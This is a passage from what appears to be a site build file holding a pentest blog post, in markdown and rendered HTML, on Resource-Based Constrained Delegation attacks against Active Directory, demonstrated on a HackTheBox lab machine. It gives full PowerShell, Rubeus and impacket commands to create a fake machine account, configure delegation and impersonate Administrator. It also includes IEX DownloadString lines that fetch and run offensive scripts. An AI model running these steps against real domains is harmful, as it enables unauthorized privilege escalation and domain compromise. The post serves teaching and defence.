created\n\n```powershell\n$ComputerSid = Get-DomainComputer 'FAKE' -Properties objectsid | Select -Expand objectsid\n```\n\nThen we create a *security descriptor*\n\n```powershell\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\n```\n\nAnd finally let's apply *Resource-Based Constrained Delegation* to the target computer, don't forget to change the `$TARGET` to your target computer\n\n```powershell\nGet-DomainComputer '$TARGET' | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n```\n\nNow let's see if there's success...\n\n```powershell\nGet-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'\n```\n\n> It needs to show: msds-*allowedtoactonbehalfofotheridentity*\n\n**What this does?**\n\n* Modifies the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute\n* Adds your fake computer's SID to the **security descriptor**\n* Allows your fake computer to **impersonate users** on the target\n\n#### Performing S4U Attack\n\n> **S4U (Service-for-User)** is a **Kerberos extension** that allows a service to obtain tickets on behalf of users. It consists of **two components** that are often exploited for privilege escalation\n>\n> * S4U2Proxy (Service for User to Proxy)\n> * S4U2Self (Service for User to Self)\n\nIn order to do this, let's download and import `Rubeus.exe`\n\n* **Rubeus** is a **C# toolset for raw Kerberos interaction and abuse** that enables ticket extraction, *pass-the-ticket attacks*, *golden/silver ticket* creation, and **S4U** delegation exploitation in *Active Directory* environments.\n\nFirst of all, we the *FAKE* computer with the password `Password123!`, so we need the hash of that password. Keep in mind that the `domain.com` shown on the command corresponds to the actual domain we are in\n\n```powershell\n.\\Rubeus.exe hash /password:Password123! /user:FAKE$ /domain:domain.com\n```\n\n> **Output:** Provides **RC4, AES128, and AES256** hashes of the machine account password.\n\nNow let's request the service ticket for the *CIFS* service. Again keep in mind that that the `target.com` shown is the target domain we want to attack and the *administrator* user is the user we want to impersonate\n\n```powershell\n.\\Rubeus.exe s4u /user:FAKE$ /rc4:\u003CRC4-HASH> /impersonateuser:administrator /msdsspn:cifs/target.com /domain:domain.com /ptt\n```\n\n> **Output**: Provides the tickets needed\n\nFrom now, you successfully attacked **RBCD**, you can check the admin's ticket using klist\n\n```c\nklist\n```\n\n## 4. Exploitation from Linux\n\n\u003Cfigure>\u003Cimg src=\"https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FwM71JlKyVXdIIbCKf5DS%2Fimage.png?alt=media&#x26;token=377b0e3f-6f70-48fd-82ae-f934ac2aa895\" alt=\"\">\u003Cfigcaption>\u003C/figcaption>\u003C/figure>\n\n#### 4.1 Download toolset\n\nIn order to continue with the exploitation, we need to install `impacket` if we don't have it installed on our attacker system\n\n> **Impacket** is a **collection of Python classes and scripts for working with network protocols** that provides programmatic low-level access to protocols like SMB, MSRPC, Kerberos, and LDAP for penetration testing and red team operations.\n\n::github{repo=\"fortra/impacket\"}\n\n#### 4.2 Create the Machine Account\n\nFirst let's create an *Attacker-Controlled Machine Account* called `FAKE01$` with the following password: `Password123!`\n\n```bash\nimpacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-ip \u003CIP> '\u003Cdomain>/\u003CUser>:\u003CPassword>'\n```\n\n> **Output:** \\[+] Successfully added machine account FAKE01$ with password Password123!\\*\n\n#### 4.3 Configuring RBCD\n\nNow let's grant *RBCD* permissions to allow `FAKE01$` to delegate to `target$` successfully while target$ being the victim computer object we want to delegate to\n\n```bash\nimpacket-rbcd -delegate-to '$target' -delegate-from 'FAKE01$' -dc-ip \u003Cip> -action write '\u003Cdomain>/\u003Cuser>:\u003Cpassword>'\n```\n\n> **Output:** *\\[+] Delegation rights modified successfully!*\n\n#### 4.4 Request the Impersonation Ticket & Export it\n\nTo finish this let's request an *Impersonation Ticket*\n\n```bash\nimpacket-getST -spn cifs/$target -impersonate Administrator -dc-ip \u003Cip> '\u003Cdomain>/FAKE01$:Password123!'\n```\n\nWe're almost there, just export the *Kerberos Ticket*\n\n```bash\nexport KRB5CCNAME=Administrator.ccache\n```\n\nFrom now, you successfully attacked **RBCD**, you can check the admin's ticket using klist\n\n```c\nklist\n```\n\n## 5. Conclusion\n\nRBCD attacks reveal a critical truth in Active Directory security: **excessive permissions on computer objects can lead to complete domain compromise**. This isn't a complex exploit—it's abusing legitimate Kerberos features that become dangerous when combined with misconfigured trust.\n\nThe attack works because:\n\n* **Default settings** allow any user to create computer accounts\n* **Write permissions** on computer objects enable delegation configuration\n* **Kerberos delegation** lets services impersonate users across systems\n\nWhat makes RBCD particularly dangerous is its simplicity. With just a few commands, an attacker can escalate from basic domain user to domain administrator by weaponizing the very trust relationships designed to make AD functional.\n\n### 5.2 **How to Prevent It:**\n\n1. **Clean up permissions** regularly\n2. **Monitor for new computer accounts**\n3. **Use \"cannot be delegated\" for important admin accounts**\n4. **Remember: in Active Directory, who you trust is more important than what you know**","src/content/posts/rbcd.md","6b41e39c7af1fac4",{"html":336,"metadata":337},"\u003Csection>\u003Ch1 id=\"resource-based-constrained-delegation\">Resource-Based Constrained Delegation\u003Ca class=\"anchor\" href=\"#resource-based-constrained-delegation\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h1>\u003Cp>\u003Cem>In many different environments, our Pentest team finds the same common active directory related vulnerabilities over and over again. Those can often be exploited for privilege escalation and or lateral movement. This blog post presents one of these well-known publicly documented attack techniques – namely \u003Cstrong>Resource Based Constrained Delegation (RBCD)\u003C/strong>\u003C/em>.\u003C/p>\u003Csection>\u003Ch2 id=\"1-how-does-it-work\">1. How Does it work?\u003Ca class=\"anchor\" href=\"#1-how-does-it-work\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Csection>\u003Ch3 id=\"11-understanding-ad-delegation\">1.1 \u003Cstrong>Understanding AD Delegation\u003C/strong>\u003Ca class=\"anchor\" href=\"#11-understanding-ad-delegation\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cp>In \u003Cstrong>Active Directory\u003C/strong>, delegation allows \u003Cstrong>impersonating other user accounts\u003C/strong> on target computers after delegation permissions are granted. There are \u003Cstrong>three main types\u003C/strong> of delegation:\u003C/p>\u003Col>\n\u003Cli>\u003Cstrong>Unconstrained Delegation\u003C/strong>\u003C/li>\n\u003Cli>\u003Cstrong>Constrained Delegation\u003C/strong>\u003C/li>\n\u003Cli>\u003Cstrong>Resource-Based Constrained Delegation (RBCD)\u003C/strong>\u003C/li>\n\u003C/ol>\u003Cp>This explanation focuses on \u003Cstrong>RBCD attacks\u003C/strong>.\u003C/p>\u003C/section>\u003Csection>\u003Ch3 id=\"12-constrained-vs-resource-based-delegation\">1.2 \u003Cstrong>Constrained vs Resource-Based Delegation\u003C/strong>\u003Ca class=\"anchor\" href=\"#12-constrained-vs-resource-based-delegation\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Csection>\u003Ch4 id=\"constrained-delegation\">\u003Cstrong>Constrained Delegation:\u003C/strong>\u003Ca class=\"anchor\" href=\"#constrained-delegation\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h4>\u003Cul>\n\u003Cli>Uses the \u003Cstrong>\u003Ccode>msDS-AllowedToDelegateTo\u003C/code>\u003C/strong> attribute\u003C/li>\n\u003Cli>Configured on the \u003Cstrong>source\u003C/strong> object (the one being granted rights)\u003C/li>\n\u003Cli>Allows impersonation for \u003Cstrong>specific services\u003C/strong>\u003C/li>\n\u003C/ul>\u003C/section>\u003C/section>\u003Csection>\u003Ch3 id=\"13-example-checking-constrained-delegation\">1.3 Example: Checking constrained delegation\u003Ca class=\"anchor\" href=\"#13-example-checking-constrained-delegation\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cdiv class=\"expressive-code\">\u003Clink rel=\"stylesheet\" href=\"/_astro/ec.4fsv9.css\">\u003Cscript type=\"module\" src=\"/_astro/ec.g1fg5.js\">\u003C/script>\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:33ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Get-DomainUser\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">TrustedToAuth\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Get-DomainComputer\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">TrustedToAuth\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Csection>\u003Ch4 id=\"resource-based-constrained-delegation-rbcd\">\u003Cstrong>Resource-Based Constrained Delegation (RBCD):\u003C/strong>\u003Ca class=\"anchor\" href=\"#resource-based-constrained-delegation-rbcd\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h4>\u003Cul>\n\u003Cli>Uses the \u003Cstrong>\u003Ccode>msDS-AllowedToActOnBehalfOfOtherIdentity\u003C/code>\u003C/strong> attribute\u003C/li>\n\u003Cli>Configured on the \u003Cstrong>target\u003C/strong> object (the resource being accessed)\u003C/li>\n\u003Cli>\u003Cstrong>Computer-to-computer\u003C/strong> delegation only\u003C/li>\n\u003C/ul>\u003Cp>If you want to learn more about the attack, \u003Ca href=\"https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview\">Microsoft offers some documentation\u003C/a> about it\u003C/p>\u003C/section>\u003C/section>\u003C/section>\u003Csection>\u003Ch2 id=\"2-scenario\">2. Scenario\u003Ca class=\"anchor\" href=\"#2-scenario\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>In order to explain this attack, we will use the \u003Ca href=\"https://www.hackthebox.com/machines/support\">Support\u003C/a> machine of \u003Cem>\u003Cstrong>HackTheBox\u003C/strong>\u003C/em>\u003C/p>\u003Csection>\u003Ch3 id=\"21-enumerating\">2.1 Enumerating\u003Ca class=\"anchor\" href=\"#21-enumerating\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cp>The easiest way to enumerate RBCD misconfigurations is using \u003Cstrong>BloodHound\u003C/strong>. Mark your current user as owned and perform the \u003Cstrong>“Shortest Paths from Owned Principles”\u003C/strong> query.\u003C/p>\u003Ca id=\"GCqnizbn-card\" class=\"card-github fetch-waiting no-styling\" href=\"https://github.com/SpecterOps/BloodHound\" target=\"_blank\" repo=\"SpecterOps/BloodHound\">\u003Cdiv class=\"gc-titlebar\">\u003Cdiv class=\"gc-titlebar-left\">\u003Cdiv class=\"gc-owner\">\u003Cdiv id=\"GCqnizbn-avatar\" class=\"gc-avatar\">\u003C/div>\u003Cdiv class=\"gc-user\">SpecterOps\u003C/div>\u003C/div>\u003Cdiv class=\"gc-divider\">/\u003C/div>\u003Cdiv class=\"gc-repo\">BloodHound\u003C/div>\u003C/div>\u003Cdiv class=\"github-logo\">\u003C/div>\u003C/div>\u003Cdiv id=\"GCqnizbn-description\" class=\"gc-description\">Waiting for api.github.com...\u003C/div>\u003Cdiv class=\"gc-infobar\">\u003Cdiv id=\"GCqnizbn-stars\" class=\"gc-stars\">00K\u003C/div>\u003Cdiv id=\"GCqnizbn-forks\" class=\"gc-forks\">0K\u003C/div>\u003Cdiv id=\"GCqnizbn-license\" class=\"gc-license\">0K\u003C/div>\u003Cspan id=\"GCqnizbn-language\" class=\"gc-language\">Waiting...\u003C/span>\u003C/div>\u003Cscript id=\"GCqnizbn-script\" type=\"text/javascript\" defer>\n      fetch('https://api.github.com/repos/SpecterOps/BloodHound', { referrerPolicy: \"no-referrer\" }).then(response => response.json()).then(data => {\n        document.getElementById('GCqnizbn-description').innerText = data.description?.replace(/:[a-zA-Z0-9_]+:/g, '') || \"Description not set\";\n        document.getElementById('GCqnizbn-language').innerText = data.language;\n        document.getElementById('GCqnizbn-forks').innerText = Intl.NumberFormat('en-us', { notation: \"compact\", maximumFractionDigits: 1 }).format(data.forks).replaceAll(\" \", '');\n        document.getElementById('GCqnizbn-stars').innerText = Intl.NumberFormat('en-us', { notation: \"compact\", maximumFractionDigits: 1 }).format(data.stargazers_count).replaceAll(\" \", '');\n        const avatarEl = document.getElementById('GCqnizbn-avatar');\n        avatarEl.style.backgroundImage = 'url(' + data.owner.avatar_url + ')';\n        avatarEl.style.backgroundColor = 'transparent';\n        document.getElementById('GCqnizbn-license').innerText = data.license?.spdx_id || \"no-license\";\n        document.getElementById('GCqnizbn-card').classList.remove(\"fetch-waiting\");\n        console.log(\"[GITHUB-CARD] Loaded card for SpecterOps/BloodHound | GCqnizbn.\")\n      }).catch(err => {\n        const c = document.getElementById('GCqnizbn-card');\n        c?.classList.add(\"fetch-error\");\n        console.warn(\"[GITHUB-CARD] (Error) Loading card for SpecterOps/BloodHound | GCqnizbn.\")\n      })\n    \u003C/script>\u003C/a>\u003Cfigure>\u003Cimg src=\"https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Fyxfqm0qieV9xXw47hJxw%2Fimage.png?alt=media&#x26;token=8da120cd-982c-4fa1-8678-1e83d664bb9e\" alt=\"\">\u003Cfigcaption>\u003C/figcaption>\u003C/figure>\u003Cp>In a \u003Cem>Resource-Based Constrained Delegation\u003C/em> scenario we will see that a user or group has \u003Cem>GenericAll / GenericWrite / Owns / WriteDacl\u003C/em> \u003Cstrong>ACL\u003C/strong> over a computer\u003C/p>\u003Cp>Any of these permissions can be developed onto the \u003Cem>Resource-Based Constrained Delegation\u003C/em> like in this case the group \u003Ccode>SHARED SUPPORT ACCOUNTS\u003C/code> has \u003Cem>GenericAll\u003C/em> over the computer \u003Ccode>DC.SUPPORT.HTB\u003C/code>\u003C/p>\u003C/section>\u003C/section>\u003Csection>\u003Ch2 id=\"3-exploitation-from-windows\">3. Exploitation from Windows\u003Ca class=\"anchor\" href=\"#3-exploitation-from-windows\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cfigure>\u003Cimg src=\"https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FmNQTTBwJsZuiLZ1u8cIR%2Fimage.png?alt=media&#x26;token=5f6cbf6c-2533-4d02-bcc9-61901f101b17\" alt=\"\">\u003Cfigcaption>\u003C/figcaption>\u003C/figure>\u003Cp>First we will need to download and import \u003Ccode>PowerMad.ps1\u003C/code>\u003C/p>\u003Csection>\u003Ch4 id=\"31-downloading-toolset\">3.1 Downloading toolset\u003Ca class=\"anchor\" href=\"#31-downloading-toolset\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h4>\u003Cblockquote>\n\u003Cp>\u003Cstrong>PowerMad\u003C/strong> is a \u003Cstrong>PowerShell toolkit\u003C/strong> for Active Directory that enables \u003Cstrong>machine account creation and DNS record manipulation\u003C/strong> using standard domain user privileges for \u003Ccode>RBCD\u003C/code> attacks.\u003C/p>\n\u003C/blockquote>\u003Ca id=\"GCp36lcg-card\" class=\"card-github fetch-waiting no-styling\" href=\"https://github.com/Kevin-Robertson/Powermad\" target=\"_blank\" repo=\"Kevin-Robertson/Powermad\">\u003Cdiv class=\"gc-titlebar\">\u003Cdiv class=\"gc-titlebar-left\">\u003Cdiv class=\"gc-owner\">\u003Cdiv id=\"GCp36lcg-avatar\" class=\"gc-avatar\">\u003C/div>\u003Cdiv class=\"gc-user\">Kevin-Robertson\u003C/div>\u003C/div>\u003Cdiv class=\"gc-divider\">/\u003C/div>\u003Cdiv class=\"gc-repo\">Powermad\u003C/div>\u003C/div>\u003Cdiv class=\"github-logo\">\u003C/div>\u003C/div>\u003Cdiv id=\"GCp36lcg-description\" class=\"gc-description\">Waiting for api.github.com...\u003C/div>\u003Cdiv class=\"gc-infobar\">\u003Cdiv id=\"GCp36lcg-stars\" class=\"gc-stars\">00K\u003C/div>\u003Cdiv id=\"GCp36lcg-forks\" class=\"gc-forks\">0K\u003C/div>\u003Cdiv id=\"GCp36lcg-license\" class=\"gc-license\">0K\u003C/div>\u003Cspan id=\"GCp36lcg-language\" class=\"gc-language\">Waiting...\u003C/span>\u003C/div>\u003Cscript id=\"GCp36lcg-script\" type=\"text/javascript\" defer>\n      fetch('https://api.github.com/repos/Kevin-Robertson/Powermad', { referrerPolicy: \"no-referrer\" }).then(response => response.json()).then(data => {\n        document.getElementById('GCp36lcg-description').innerText = data.description?.replace(/:[a-zA-Z0-9_]+:/g, '') || \"Description not set\";\n        document.getElementById('GCp36lcg-language').innerText = data.language;\n        document.getElementById('GCp36lcg-forks').innerText = Intl.NumberFormat('en-us', { notation: \"compact\", maximumFractionDigits: 1 }).format(data.forks).replaceAll(\" \", '');\n        document.getElementById('GCp36lcg-stars').innerText = Intl.NumberFormat('en-us', { notation: \"compact\", maximumFractionDigits: 1 }).format(data.stargazers_count).replaceAll(\" \", '');\n        const avatarEl = document.getElementById('GCp36lcg-avatar');\n        avatarEl.style.backgroundImage = 'url(' + data.owner.avatar_url + ')';\n        avatarEl.style.backgroundColor = 'transparent';\n        document.getElementById('GCp36lcg-license').innerText = data.license?.spdx_id || \"no-license\";\n        document.getElementById('GCp36lcg-card').classList.remove(\"fetch-waiting\");\n        console.log(\"[GITHUB-CARD] Loaded card for Kevin-Robertson/Powermad | GCp36lcg.\")\n      }).catch(err => {\n        const c = document.getElementById('GCp36lcg-card');\n        c?.classList.add(\"fetch-error\");\n        console.warn(\"[GITHUB-CARD] (Error) Loading card for Kevin-Robertson/Powermad | GCp36lcg.\")\n      })\n    \u003C/script>\u003C/a>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:126ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">IEX(\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">New-Object\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> Net.WebClient).DownloadString(\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Import-Module\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> Powermad.ps1\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>And \u003Ccode>PowerView.ps1\u003C/code>\u003C/p>\u003Cblockquote>\n\u003Cp>\u003Cstrong>PowerView\u003C/strong> is a \u003Cstrong>PowerShell reconnaissance tool\u003C/strong> for Active Directory that enables \u003Cstrong>permission enumeration, object querying, and attack path discovery\u003C/strong> through extensive AD property and ACL analysis.\u003C/p>\n\u003C/blockquote>\u003Ca id=\"GC6wy96l-card\" class=\"card-github fetch-waiting no-styling\" href=\"https://github.com/PowerShellMafia/PowerSploit\" target=\"_blank\" repo=\"PowerShellMafia/PowerSploit\">\u003Cdiv class=\"gc-titlebar\">\u003Cdiv class=\"gc-titlebar-left\">\u003Cdiv class=\"gc-owner\">\u003Cdiv id=\"GC6wy96l-avatar\" class=\"gc-avatar\">\u003C/div>\u003Cdiv class=\"gc-user\">PowerShellMafia\u003C/div>\u003C/div>\u003Cdiv class=\"gc-divider\">/\u003C/div>\u003Cdiv class=\"gc-repo\">PowerSploit\u003C/div>\u003C/div>\u003Cdiv class=\"github-logo\">\u003C/div>\u003C/div>\u003Cdiv id=\"GC6wy96l-description\" class=\"gc-description\">Waiting for api.github.com...\u003C/div>\u003Cdiv class=\"gc-infobar\">\u003Cdiv id=\"GC6wy96l-stars\" class=\"gc-stars\">00K\u003C/div>\u003Cdiv id=\"GC6wy96l-forks\" class=\"gc-forks\">0K\u003C/div>\u003Cdiv id=\"GC6wy96l-license\" class=\"gc-license\">0K\u003C/div>\u003Cspan id=\"GC6wy96l-language\" class=\"gc-language\">Waiting...\u003C/span>\u003C/div>\u003Cscript id=\"GC6wy96l-script\" type=\"text/javascript\" defer>\n      fetch('https://api.github.com/repos/PowerShellMafia/PowerSploit', { referrerPolicy: \"no-referrer\" }).then(response => response.json()).then(data => {\n        document.getElementById('GC6wy96l-description').innerText = data.description?.replace(/:[a-zA-Z0-9_]+:/g, '') || \"Description not set\";\n        document.getElementById('GC6wy96l-language').innerText = data.language;\n        document.getElementById('GC6wy96l-forks').innerText = Intl.NumberFormat('en-us', { notation: \"compact\", maximumFractionDigits: 1 }).format(data.forks).replaceAll(\" \", '');\n        document.getElementById('GC6wy96l-stars').innerText = Intl.NumberFormat('en-us', { notation: \"compact\", maximumFractionDigits: 1 }).format(data.stargazers_count).replaceAll(\" \", '');\n        const avatarEl = document.getElementById('GC6wy96l-avatar');\n        avatarEl.style.backgroundImage = 'url(' + data.owner.avatar_url + ')';\n        avatarEl.style.backgroundColor = 'transparent';\n        document.getElementById('GC6wy96l-license').innerText = data.license?.spdx_id || \"no-license\";\n        document.getElementById('GC6wy96l-card').classList.remove(\"fetch-waiting\");\n        console.log(\"[GITHUB-CARD] Loaded card for PowerShellMafia/PowerSploit | GC6wy96l.\")\n      }).catch(err => {\n        const c = document.getElementById('GC6wy96l-card');\n        c?.classList.add(\"fetch-error\");\n        console.warn(\"[GITHUB-CARD] (Error) Loading card for PowerShellMafia/PowerSploit | GC6wy96l.\")\n      })\n    \u003C/script>\u003C/a>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:136ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">IEX(\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">New-Object\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> Net.WebClient).DownloadString(\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Import-Module\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> PowerView.ps1\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 